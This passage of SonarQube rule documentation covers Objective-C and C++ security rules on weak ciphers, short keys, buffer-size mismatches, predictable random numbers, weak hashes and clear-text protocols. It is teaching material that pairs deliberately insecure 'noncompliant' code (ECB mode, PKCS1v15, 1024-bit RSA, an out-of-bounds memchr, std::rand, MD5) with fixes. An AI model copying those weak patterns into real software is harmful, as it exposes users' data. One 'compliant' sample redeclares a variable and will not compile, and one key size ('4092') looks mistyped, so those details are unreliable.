<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
#include &lt;botan/cipher_mode.h&gt;

void encrypt() {
  Botan::Cipher_Mode::create("AES-256/GCM", Botan::ENCRYPTION);
}
</pre>
<h3>How does this work?</h3>
<h4>Use a secure algorithm</h4>
<p>It is highly recommended to use an algorithm that is currently considered secure by the cryptographic community. A common choice for such an
algorithm is the Advanced Encryption Standard (AES).</p>
<p>For block ciphers, it is not recommended to use algorithms with a block size that is smaller than 128 bits.</p>
<h2>Resources</h2>
<h3>Documentation</h3>
<ul>
  <li> <a href="https://botan.randombit.net/handbook/">Botan</a> - Handbook </li>
  <li> <a href="https://www.feistyduck.com/books/openssl-cookbook/">OpenSSL</a> - Cookbook </li>
</ul>
<h3>Standards</h3>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A02_2021-Cryptographic_Failures/">Top 10 2021 Category A2 - Cryptographic Failures</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure">Top 10 2017 Category A3 - Sensitive Data
  Exposure</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration">Top 10 2017 Category A6 - Security
  Misconfiguration</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/327">CWE-327 - Use of a Broken or Risky Cryptographic Algorithm</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=objc:S5542">
              objc:S5542
            </a>
          </td>
          <td>
            <details>
              <p>This vulnerability exposes encrypted data to a number of attacks whose goal is to recover the plaintext.</p>
<h2>Why is this an issue?</h2>
<p>Encryption algorithms are essential for protecting sensitive information and ensuring secure communications in a variety of domains. They are used
for several important reasons:</p>
<ul>
  <li> Confidentiality, privacy, and intellectual property protection </li>
  <li> Security during transmission or on storage devices </li>
  <li> Data integrity, general trust, and authentication </li>
</ul>
<p>When selecting encryption algorithms, tools, or combinations, you should also consider two things:</p>
<ol>
  <li> No encryption is unbreakable. </li>
  <li> The strength of an encryption algorithm is usually measured by the effort required to crack it within a reasonable time frame. </li>
</ol>
<p>For these reasons, as soon as cryptography is included in a project, it is important to choose encryption algorithms that are considered strong and
secure by the cryptography community.</p>
<p>For AES, the weakest mode is ECB (Electronic Codebook). Repeated blocks of data are encrypted to the same value, making them easy to identify and
reducing the difficulty of recovering the original cleartext.</p>
<p>Unauthenticated modes such as CBC (Cipher Block Chaining) may be used but are prone to attacks that manipulate the ciphertext. They must be used
with caution.</p>
<p>For RSA, the weakest algorithms are either using it without padding or using the PKCS1v1.5 padding scheme.</p>
<h3>What is the potential impact?</h3>
<p>The cleartext of an encrypted message might be recoverable. Additionally, it might be possible to modify the cleartext of an encrypted message.</p>
<p>Below are some real-world scenarios that illustrate possible impacts of an attacker exploiting the vulnerability.</p>
<h4>Theft of sensitive data</h4>
<p>The encrypted message might contain data that is considered sensitive and should not be known to third parties.</p>
<p>By using a weak algorithm the likelihood that an attacker might be able to recover the cleartext drastically increases.</p>
<h4>Additional attack surface</h4>
<p>By modifying the cleartext of the encrypted message it might be possible for an attacker to trigger other vulnerabilities in the code. Encrypted
values are often considered trusted, since under normal circumstances it would not be possible for a third party to modify them.</p>
<h2>How to fix it in Botan</h2>
<h3>Code examples</h3>
<h4>Noncompliant code example</h4>
<p>Example with a symmetric cipher, AES:</p>
<pre data-diff-id="1" data-diff-type="noncompliant">
#include &lt;botan/cipher_mode.h&gt;

void encrypt() {
  Botan::Cipher_Mode::create("AES-256/ECB", Botan::ENCRYPTION); // Noncompliant
}
</pre>
<p>Example with an asymmetric cipher, RSA:</p>
<pre data-diff-id="2" data-diff-type="noncompliant">
#include &lt;botan/rng.h&gt;
#include &lt;botan/auto_rng.h&gt;
#include &lt;botan/rsa.h&gt;
#include &lt;botan/pubkey.h&gt;

void encrypt() {
  std::unique_ptr&lt;Botan::RandomNumberGenerator&gt;   rng(new Botan::AutoSeeded_RNG);
  Botan::RSA_PrivateKey                           rsaKey(*rng.get(), 2048);

  Botan::PK_Encryptor_EME(rsaKey, *rng.get(), "PKCS1v15"); // Noncompliant
}
</pre>
<h4>Compliant solution</h4>
<p>For the AES symmetric cipher, use the GCM mode:</p>
<pre data-diff-id="1" data-diff-type="compliant">
#include &lt;botan/cipher_mode.h&gt;

void encrypt() {
  Botan::Cipher_Mode::create("AES-256/GCM", Botan::ENCRYPTION);
}
</pre>
<p>For the RSA asymmetric cipher, use the Optimal Asymmetric Encryption Padding (OAEP):</p>
<pre data-diff-id="2" data-diff-type="compliant">
#include &lt;botan/rng.h&gt;
#include &lt;botan/auto_rng.h&gt;
#include &lt;botan/rsa.h&gt;
#include &lt;botan/pubkey.h&gt;

void encrypt() {
  std::unique_ptr&lt;Botan::RandomNumberGenerator&gt;   rng(new Botan::AutoSeeded_RNG);
  Botan::RSA_PrivateKey                           rsaKey(*rng.get(), 2048);

  Botan::PK_Encryptor_EME(rsaKey, *rng.get(), "OAEP");
}
</pre>
<h3>How does this work?</h3>
<p>As a rule of thumb, use the cryptographic algorithms and mechanisms that are considered strong by the cryptographic community.</p>
<p>Appropriate choices are currently the following.</p>
<h4>For AES: use authenticated encryption modes</h4>
<p>The best-known authenticated encryption mode for AES is Galois/Counter mode (GCM).</p>
<p>GCM mode combines encryption with authentication and integrity checks using a cryptographic hash function and provides both confidentiality and
authenticity of data.</p>
<p>Other similar modes are:</p>
<ul>
  <li> CCM: <code>Counter with CBC-MAC</code> </li>
  <li> CWC: <code>Cipher Block Chaining with Message Authentication Code</code> </li>
  <li> EAX: <code>Encrypt-and-Authenticate</code> </li>
  <li> IAPM: <code>Integer Authenticated Parallelizable Mode</code> </li>
  <li> OCB: <code>Offset Codebook Mode</code> </li>
</ul>
<p>It is also possible to use AES-CBC with HMAC for integrity checks. However, it is considered more straightforward to use AES-GCM directly
instead.</p>
<h4>For RSA: use the OAEP scheme</h4>
<p>The Optimal Asymmetric Encryption Padding scheme (OAEP) adds randomness and a secure hash function that strengthens the regular inner workings of
RSA.</p>
<h2>Resources</h2>
<h3>Articles &amp; blog posts</h3>
<ul>
  <li> <a href="https://learn.microsoft.com/en-us/dotnet/standard/security/vulnerabilities-cbc-mode">Microsoft, Timing vulnerabilities with CBC-mode
  symmetric decryption using padding</a> </li>
  <li> <a href="https://en.wikipedia.org/wiki/Padding_oracle_attack">Wikipedia, Padding Oracle Attack</a> </li>
  <li> <a href="https://en.wikipedia.org/wiki/Chosen-ciphertext_attack">Wikipedia, Chosen-Ciphertext Attack</a> </li>
  <li> <a href="https://en.wikipedia.org/wiki/Chosen-plaintext_attack">Wikipedia, Chosen-Plaintext Attack</a> </li>
  <li> <a href="https://en.wikipedia.org/wiki/Semantic_security">Wikipedia, Semantically Secure Cryptosystems</a> </li>
  <li> <a href="https://en.wikipedia.org/wiki/Optimal_asymmetric_encryption_padding">Wikipedia, OAEP</a> </li>
  <li> <a href="https://en.wikipedia.org/wiki/Galois/Counter_Mode">Wikipedia, Galois/Counter Mode</a> </li>
</ul>
<h3>Standards</h3>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A02_2021-Cryptographic_Failures/">Top 10 2021 Category A2 - Cryptographic Failures</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure">Top 10 2017 Category A3 - Sensitive Data
  Exposure</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration">Top 10 2017 Category A6 - Security
  Misconfiguration</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/327">CWE-327 - Use of a Broken or Risky Cryptographic Algorithm</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=objc:S5782">
              objc:S5782
            </a>
          </td>
          <td>
            <details>
              <p>Some POSIX functions take one argument that is a buffer and another one that represents the size of the buffer. It is up to the developer to make
sure the two arguments do match and that the size argument does not exceed the buffer’s size.</p>
<h2>Why is this an issue?</h2>
<p>When the size argument exceeds the actual size of the buffer, the memory management functions will either read or write data past the buffer memory
boundary into adjacent memory. Because the memory might be uninitialized or contain other pieces of data, the behavior of the affected function can
not be predicted and will likely trigger bugs.</p>
<h3>What is the potential impact?</h3>
<p>Buffer boundaries violations can lead to serious security issues.</p>
<h4>Information disclosure</h4>
<p>In some scenarios, insecure functions can lead to information disclosure. For instance, if an attacker can cause a buffer overread, they might be
able to disclose data in memory that they’re not supposed to have access to. This could potentially allow them to access sensitive information, such
as passwords or encryption keys. An example of a buffer overread is provided with the Heartbleed vulnerability. ==== Code execution</p>
<p>In some cases, an attacker can craft input in a way that allows them to gain unauthorized access to your system. For example, they might be able to
overwrite a function’s return address in memory, causing your program to execute code of the attacker’s choosing. This could potentially give the
attacker full control over your system.</p>
<h4>Denial of service</h4>
<p>If an attacker can trigger a buffer overflow by providing oversized input, it can cause the program to crash. If the attacker repeats this process,
it can continually disrupt the service, denying access to other users. This can be particularly damaging for services that require high availability,
such as online platforms or databases.</p>
<p>In some cases, the input might cause the program to enter an infinite loop or consume excessive memory, slowing down the system or even causing it
to become unresponsive. This type of attack is known as a resource exhaustion DoS attack.</p>
<h3>Exceptions</h3>
<p>Functions related to sockets using the type <code>socklen_t</code> are not checked. This is because these functions are using a C-style polymorphic
pattern using <code>union</code>. It relies on a mismatch between allocated memory and sizes of structures and it creates false positives.</p>
<h2>How to fix it</h2>
<h3>Code examples</h3>
<p>In the following code example, <code>memchr</code> is used to find the first occurrence of the <code>@</code> character in a buffer,
<code>array</code>. The second argument does not match the size of this buffer, so it may find an occurrence of the character after the end of the
buffer and read data it is not supposed to. If the returned <code>pos</code> pointer is later used to write characters, this could unexpectedly
overwrite data.</p>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
char array[10];
initialize(array);
char *pos = memchr(array, '@', 42); // Noncompliant
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
char array[10];
initialize(array);
char *pos = memchr(array, '@', sizeof(array));
</pre>
<h2>Resources</h2>
<h3>Articles &amp; blog posts</h3>
<ul>
  <li> Heartbleed - <a href="https://heartbleed.com/">The Heartbleed Bug</a> </li>
</ul>
<h3>Standards</h3>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A06_2021-Vulnerable_and_Outdated_Components/">Top 10 2021 - A06 - Vulnerable and Outdated
  Components</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A9_2017-Using_Components_with_Known_Vulnerabilities">Top 10 2017 Category A9 -
  Using Components with Known Vulnerabilities</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/119">CWE-119 - Improper Restriction of Operations within the Bounds of a Memory
  Buffer</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/131">CWE-131 - Incorrect Calculation of Buffer Size</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/788">CWE-788 - Access of Memory Location After End of Buffer</a> </li>
</ul>
<h3>External coding guidelines</h3>
<ul>
  <li> CERT - <a href="https://wiki.sei.cmu.edu/confluence/x/wtYxBQ">ARR30-C. - Do not form or use out-of-bounds pointers or array subscripts</a>
  </li>
  <li> CERT - <a href="https://wiki.sei.cmu.edu/confluence/x/i3w-BQ">STR50-CPP. - Guarantee that storage for strings has sufficient space for
  character data and the null terminator</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=objc:S4426">
              objc:S4426
            </a>
          </td>
          <td>
            <details>
              <p>This vulnerability exposes encrypted data to attacks whose goal is to recover the plaintext.</p>
<h2>Why is this an issue?</h2>
<p>Encryption algorithms are essential for protecting sensitive information and ensuring secure communications in a variety of domains. They are used
for several important reasons:</p>
<ul>
  <li> Confidentiality, privacy, and intellectual property protection </li>
  <li> Security during transmission or on storage devices </li>
  <li> Data integrity, general trust, and authentication </li>
</ul>
<p>When selecting encryption algorithms, tools, or combinations, you should also consider two things:</p>
<ol>
  <li> No encryption is unbreakable. </li>
  <li> The strength of an encryption algorithm is usually measured by the effort required to crack it within a reasonable time frame. </li>
</ol>
<p>In today’s cryptography, the length of the <strong>key</strong> directly affects the security level of cryptographic algorithms.</p>
<p>Note that depending on the algorithm, the term <strong>key</strong> refers to a different mathematical property. For example:</p>
<ul>
  <li> For RSA, the key is the product of two large prime numbers, also called the <strong>modulus</strong>. </li>
  <li> For AES and Elliptic Curve Cryptography (ECC), the key is only a sequence of randomly generated bytes.
    <ul>
      <li> In some cases, AES keys are derived from a master key or a passphrase using a Key Derivation Function (KDF) like PBKDF2 (Password-Based Key
      Derivation Function 2) </li>
    </ul>  </li>
</ul>
<p>If an application uses a key that is considered short and <strong>insecure</strong>, the encrypted data is exposed to attacks aimed at getting at
the plaintext.</p>
<p>In general, it is best practice to expect a breach: that a user or organization with malicious intent will perform cryptographic attacks on this
data after obtaining it by other means.</p>
<h3>What is the potential impact?</h3>
<p>After retrieving encrypted data and performing cryptographic attacks on it on a given timeframe, attackers can recover the plaintext that
encryption was supposed to protect.</p>
<p>Depending on the recovered data, the impact may vary.</p>
<p>Below are some real-world scenarios that illustrate the potential impact of an attacker exploiting the vulnerability.</p>
<h4>Additional attack surface</h4>
<p>By modifying the plaintext of the encrypted message, an attacker may be able to trigger additional vulnerabilities in the code. An attacker can
further exploit a system to obtain more information.<br> Encrypted values are often considered trustworthy because it would not be possible for a
third party to modify them under normal circumstances.</p>
<h4>Breach of confidentiality and privacy</h4>
<p>When encrypted data contains personal or sensitive information, its retrieval by an attacker can lead to privacy violations, identity theft,
financial loss, reputational damage, or unauthorized access to confidential systems.</p>
<p>In this scenario, the company, its employees, users, and partners could be seriously affected.</p>
<p>The impact is twofold, as data breaches and exposure of encrypted data can undermine trust in the organization, as customers, clients and
stakeholders may lose confidence in the organization’s ability to protect their sensitive data.</p>
<h4>Legal and compliance issues</h4>
<p>In many industries and locations, there are legal and compliance requirements to protect sensitive data. If encrypted data is compromised and the
plaintext can be recovered, companies face legal consequences, penalties, or violations of privacy laws.</p>
<h2>How to fix it in Botan</h2>
<h3>Code examples</h3>
<p>The following code examples either explicitly or implicitly generate keys. Note that there are differences in the size of the keys depending on the
algorithm.</p>
<p>Due to the mathematical properties of the algorithms, the security requirements for the key size vary depending on the algorithm.<br> For example,
a 256-bit ECC key provides about the same level of security as a 3072-bit RSA key and a 128-bit symmetric key.</p>
<h4>Noncompliant code example</h4>
<p>Here is an example of a private key generation with RSA:</p>
<pre data-diff-id="1" data-diff-type="noncompliant">
#include &lt;botan/pubkey.h&gt;
#include &lt;botan/rng.h&gt;
#include &lt;botan/rsa.h&gt;

void encrypt() {
    std::unique_ptr&lt;Botan::RandomNumberGenerator&gt;   rng(new Botan::System_RNG);
    Botan::RSA_PrivateKey                           rsaKey(*rng, 1024); // Noncompliant
}
</pre>
<p>Here is an example with the generation of a key as part of a Discrete Logarithmic (DL) group, a Digital Signature Algorithm (DSA) parameter:</p>
<pre data-diff-id="2" data-diff-type="noncompliant">
#include &lt;botan/dl_group.h&gt;

void encrypt() {
    Botan::DL_Group("dsa/botan/1024"); // Noncompliant
}
</pre>
<p>Here is an example of an Elliptic Curve (EC) initialization. It implicitly generates a private key whose size is indicated in the elliptic curve
name:</p>
<pre data-diff-id="3" data-diff-type="noncompliant">
#include &lt;botan/ec_group.h&gt;

void encrypt() {
    Botan::EC_Group("secp160k1"); // Noncompliant
}
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
#include &lt;botan/pubkey.h&gt;
#include &lt;botan/rng.h&gt;
#include &lt;botan/rsa.h&gt;

void encrypt() {
    std::unique_ptr&lt;Botan::RandomNumberGenerator&gt;   rng(new Botan::System_RNG);
    Botan::RSA_PrivateKey                           rsaKey(*rng, 2048);
}
</pre>
<pre data-diff-id="2" data-diff-type="compliant">
#include &lt;botan/dl_group.h&gt;

void encrypt() {
    Botan::DL_Group("dsa/botan/2048");
}
</pre>
<pre data-diff-id="3" data-diff-type="compliant">
#include &lt;botan/ec_group.h&gt;

void encrypt() {
    Botan::EC_Group("secp224k1");
}
</pre>
<h3>How does this work?</h3>
<p>As a rule of thumb, use the cryptographic algorithms and mechanisms that are considered strong by the cryptography community.</p>
<p>The appropriate choices are the following.</p>
<h4>RSA (Rivest-Shamir-Adleman) and DSA (Digital Signature Algorithm)</h4>
<p>The security of these algorithms depends on the difficulty of attacks attempting to solve their underlying mathematical problem.</p>
<p>In general, a minimum key size of <strong>2048</strong> bits is recommended for both. It provides 112 bits of security. A key length of
<strong>3072</strong> or <strong>4092</strong> should be preferred when possible.</p>
<h4>AES (Advanced Encryption Standard)</h4>
<p>AES supports three key sizes: 128 bits, 192 bits and 256 bits. The security of the AES algorithm is based on the computational complexity of trying
all possible keys.<br> A larger key size increases the number of possible keys and makes exhaustive search attacks computationally infeasible.
Therefore, a 256-bit key provides a higher level of security than a 128-bit or 192-bit key.</p>
<p>Currently, a minimum key size of <strong>128 bits</strong> is recommended for AES.</p>
<h4>Elliptic Curve Cryptography (ECC)</h4>
<p>Elliptic curve cryptography is also used in various algorithms, such as ECDSA, ECDH, or ECMQV. The length of keys generated with elliptic curve
algorithms is mentioned directly in their names. For example, <code>secp256k1</code> generates a 256-bits long private key.</p>
<p>Currently, a minimum key size of <strong>224 bits</strong> is recommended for EC-based algorithms.</p>
<p>Additionally, some curves that theoretically provide sufficiently long keys are still discouraged. This can be because of a flaw in the curve
parameters, a bad overall design, or poor performance. It is generally advised to use a NIST-approved elliptic curve wherever possible. Such curves
currently include:</p>
<ul>
  <li> NIST P curves with a size of at least 224 bits, e.g. secp256r1. </li>
  <li> Curve25519, generally known as ed25519 or x25519 depending on its application. </li>
  <li> Curve448. </li>
  <li> Brainpool curves with a size of at least 224 bits, e.g. brainpoolP224r1 </li>
</ul>
<h3>Going the extra mile</h3>
<h4>Pre-Quantum Cryptography</h4>
<p>Encrypted data and communications recorded today could be decrypted in the future by an attack from a quantum computer.<br> It is important to keep
in mind that NIST-approved digital signature schemes, key agreement, and key transport may need to be replaced with secure quantum-resistant (or
"post-quantum") counterpart.</p>
<p>Thus, if data is to remain secure beyond 2030, proactive measures should be taken now to ensure its safety.</p>
<p><a href="https://www.enisa.europa.eu/publications/post-quantum-cryptography-current-state-and-quantum-mitigation">Learn more here</a>.</p>
<h2>Resources</h2>
<ul>
  <li> Documentation
    <ul>
      <li> NIST Documentation - <a href="https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-186.pdf">NIST SP 800-186: Recommendations
      for Discrete Logarithm-based Cryptography: Elliptic Curve Domain Parameters</a> </li>
      <li> IETF - <a href="https://datatracker.ietf.org/doc/html/rfc5639">rfc5639: Elliptic Curve Cryptography (ECC) Brainpool Standard Curves and
      Curve Generation</a> </li>
    </ul>  </li>
</ul>
<h3>Articles &amp; blog posts</h3>
<ul>
  <li> <a href="https://learn.microsoft.com/en-us/dotnet/standard/security/vulnerabilities-cbc-mode">Microsoft, Timing vulnerabilities with CBC-mode
  symmetric decryption using padding</a> </li>
  <li> <a href="https://en.wikipedia.org/wiki/Padding_oracle_attack">Wikipedia, Padding Oracle Attack</a> </li>
  <li> <a href="https://en.wikipedia.org/wiki/Chosen-ciphertext_attack">Wikipedia, Chosen-Ciphertext Attack</a> </li>
  <li> <a href="https://en.wikipedia.org/wiki/Chosen-plaintext_attack">Wikipedia, Chosen-Plaintext Attack</a> </li>
  <li> <a href="https://en.wikipedia.org/wiki/Semantic_security">Wikipedia, Semantically Secure Cryptosystems</a> </li>
  <li> <a href="https://en.wikipedia.org/wiki/Optimal_asymmetric_encryption_padding">Wikipedia, OAEP</a> </li>
  <li> <a href="https://en.wikipedia.org/wiki/Galois/Counter_Mode">Wikipedia, Galois/Counter Mode</a> </li>
</ul>
<h3>Standards</h3>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A02_2021-Cryptographic_Failures/">Top 10 2021 Category A2 - Cryptographic Failures</a> </li>
  <li> OWASP - <a href="https://www.owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure">Top 10 2017 Category A3 - Sensitive Data
  Exposure</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration">Top 10 2017 Category A6 - Security
  Misconfiguration</a> </li>
  <li> OWASP - <a href="https://mobile-security.gitbook.io/masvs/security-requirements/0x08-v3-cryptography_verification_requirements">Mobile AppSec
  Verification Standard - Cryptography Requirements</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-mobile-top-10/2016-risks/m5-insufficient-cryptography">Mobile Top 10 2016 Category M5 -
  Insufficient Cryptography</a> </li>
  <li> <a href="https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-131Ar1.pdf">NIST 800-131A</a> - Recommendation for Transitioning the
  Use of Cryptographic Algorithms and Key Lengths </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/326">CWE-326 - Inadequate Encryption Strength</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/327">CWE-327 - Use of a Broken or Risky Cryptographic Algorithm</a> </li>
  <li> <a href="https://wiki.sei.cmu.edu/confluence/x/hDdGBQ">CERT, MSC61-J.</a> - Do not use insecure or weak cryptographic algorithms </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=objc:S2245">
              objc:S2245
            </a>
          </td>
          <td>
            <details>
              <p>Using pseudorandom number generators (PRNGs) is security-sensitive. For example, it has led in the past to the following vulnerabilities:</p>
<ul>
  <li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2013-6386">CVE-2013-6386</a> </li>
  <li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2006-3419">CVE-2006-3419</a> </li>
  <li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-4102">CVE-2008-4102</a> </li>
</ul>
<p>When software generates predictable values in a context requiring unpredictability, it may be possible for an attacker to guess the next value that
will be generated, and use this guess to impersonate another user or access sensitive information.</p>
<p>As the functions rely on a pseudorandom number generator, they should not be used for security-critical applications or for protecting sensitive
data.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> the code using the generated value requires it to be unpredictable. It is the case for all encryption mechanisms or when a secret value, such
  as a password, is hashed. </li>
  <li> the function you use generates a value which can be predicted (pseudo-random). </li>
  <li> the generated value is used multiple times. </li>
  <li> an attacker can access the generated value. </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul>
  <li> Use functions which rely on a strong random number generator such as <code>randombytes_uniform()</code> or <code>randombytes_buf()</code> from
  <code>libsodium</code>, or <code>randomize()</code> from Botan. </li>
  <li> Use the generated random values only once. </li>
  <li> You should not expose the generated random value. If you have to store it, make sure that the database or file is secure. </li>
</ul>
<h2>Sensitive Code Example</h2>
<pre>
#include &lt;random&gt;
// ...

void f() {
  int random_int = std::rand(); // Sensitive
}
</pre>
<h2>Compliant Solution</h2>
<pre>
#include &lt;sodium.h&gt;
#include &lt;botan/system_rng.h&gt;
// ...

void f() {
  char random_chars[10];
  randombytes_buf(random_chars, 10); // Compliant
  uint32_t random_int = randombytes_uniform(10); // Compliant

  uint8_t random_chars[10];
  Botan::System_RNG system;
  system.randomize(random_chars, 10); // Compliant
}
</pre>
<h2>See</h2>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A02_2021-Cryptographic_Failures/">Top 10 2021 Category A2 - Cryptographic Failures</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure">Top 10 2017 Category A3 - Sensitive Data
  Exposure</a> </li>
  <li> OWASP - <a href="https://mobile-security.gitbook.io/masvs/security-requirements/0x08-v3-cryptography_verification_requirements">Mobile AppSec
  Verification Standard - Cryptography Requirements</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-mobile-top-10/2016-risks/m5-insufficient-cryptography">Mobile Top 10 2016 Category M5 -
  Insufficient Cryptography</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/338">CWE-338 - Use of Cryptographically Weak Pseudo-Random Number Generator (PRNG)</a>
  </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/330">CWE-330 - Use of Insufficiently Random Values</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/326">CWE-326 - Inadequate Encryption Strength</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/1241">CWE-1241 - Use of Predictable Algorithm in Random Number Generator</a> </li>
  <li> <a href="https://wiki.sei.cmu.edu/confluence/x/UNcxBQ">CERT, MSC30-C.</a> - Do not use the rand() function for generating pseudorandom numbers
  </li>
  <li> <a href="https://wiki.sei.cmu.edu/confluence/x/2ns-BQ">CERT, MSC50-CPP.</a> - Do not use std::rand() for generating pseudorandom numbers </li>
  <li> Derived from FindSecBugs rule <a href="https://h3xstream.github.io/find-sec-bugs/bugs.htm#PREDICTABLE_RANDOM">Predictable Pseudo Random Number
  Generator</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=objc:S4790">
              objc:S4790
            </a>
          </td>
          <td>
            <details>
              <p>Cryptographic hash algorithms such as <code>MD2</code>, <code>MD4</code>, <code>MD5</code>, <code>MD6</code>, <code>HAVAL-128</code>,
<code>HMAC-MD5</code>, <code>DSA</code> (which uses <code>SHA-1</code>), <code>RIPEMD</code>, <code>RIPEMD-128</code>, <code>RIPEMD-160</code>,
<code>HMACRIPEMD160</code> and <code>SHA-1</code> are no longer considered secure, because it is possible to have <code>collisions</code> (little
computational effort is enough to find two or more different inputs that produce the same hash).</p>
<h2>Ask Yourself Whether</h2>
<p>The hashed value is used in a security context like:</p>
<ul>
  <li> User-password storage. </li>
  <li> Security token generation (used to confirm e-mail when registering on a website, reset password, etc …​). </li>
  <li> To compute some message integrity. </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Safer alternatives, such as <code>SHA-256</code>, <code>SHA-512</code>, <code>SHA-3</code> are recommended, and for password hashing, it’s even
better to use algorithms that do not compute too "quickly", like <code>bcrypt</code>, <code>scrypt</code>, <code>argon2</code> or <code>pbkdf2</code>
because it slows down <code>brute force attacks</code>.</p>
<h2>Sensitive Code Example</h2>
<pre>
#include &lt;botan/hash.h&gt;
// ...

Botan::secure_vector&lt;uint8_t&gt; f(std::string input){
    std::unique_ptr&lt;Botan::HashFunction&gt; hash(Botan::HashFunction::create("MD5")); // Sensitive
    return hash-&gt;process(input);
}
</pre>
<h2>Compliant Solution</h2>
<pre>
#include &lt;botan/hash.h&gt;
// ...

Botan::secure_vector&lt;uint8_t&gt; f(std::string input){
    std::unique_ptr&lt;Botan::HashFunction&gt; hash(Botan::HashFunction::create("SHA-512")); // Compliant
    return hash-&gt;process(input);
}
</pre>
<h2>See</h2>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A02_2021-Cryptographic_Failures/">Top 10 2021 Category A2 - Cryptographic Failures</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure">Top 10 2017 Category A3 - Sensitive Data
  Exposure</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration">Top 10 2017 Category A6 - Security
  Misconfiguration</a> </li>
  <li> OWASP - <a href="https://mobile-security.gitbook.io/masvs/security-requirements/0x08-v3-cryptography_verification_requirements">Mobile AppSec
  Verification Standard - Cryptography Requirements</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-mobile-top-10/2016-risks/m5-insufficient-cryptography">Mobile Top 10 2016 Category M5 -
  Insufficient Cryptography</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/1240">CWE-1240 - Use of a Risky Cryptographic Primitive</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=objc:S5332">
              objc:S5332
            </a>
          </td>
          <td>
            <details>
              <p>Clear-text protocols such as <code>ftp</code>, <code>telnet</code>, or <code>http</code> lack encryption of transported data, as well as the
capability to build an authenticated connection. It means that an attacker able to sniff traffic from the network can read, modify, or corrupt the
transported content. These protocols are not secure as they expose applications to an extensive range of risks:</p>
<ul>
  <li> sensitive data exposure </li>
  <li> traffic redirected to a malicious endpoint </li>
  <li> malware-infected software update or installer </li>
  <li> execution of client-side code </li>
  <li> corruption of critical information </li>
</ul>
<p>Even in the context of isolated networks like offline environments or segmented cloud environments, the insider threat exists. Thus, attacks
involving communications being sniffed or tampered with can still happen.</p>
<p>For example, attackers could successfully compromise prior security layers by:</p>
<ul>
  <li> bypassing isolation mechanisms </li>
  <li> compromising a component of the network </li>
  <li> getting the credentials of an internal IAM account (either from a service account or an actual person) </li>
</ul>
<p>In such cases, encrypting communications would decrease the chances of attackers to successfully leak data or steal credentials from other network
components. By layering various security practices (segmentation and encryption, for example), the application will follow the
<em>defense-in-depth</em> principle.</p>
<p>Note that using the <code>http</code> protocol is being deprecated by <a
href="https://blog.mozilla.org/security/2015/04/30/deprecating-non-secure-http">major web browsers</a>.</p>
<p>In the past, it has led to the following vulnerabilities:</p>
<ul>
  <li> <a href="https://nvd.nist.gov/vuln/detail/CVE-2019-6169">CVE-2019-6169</a> </li>
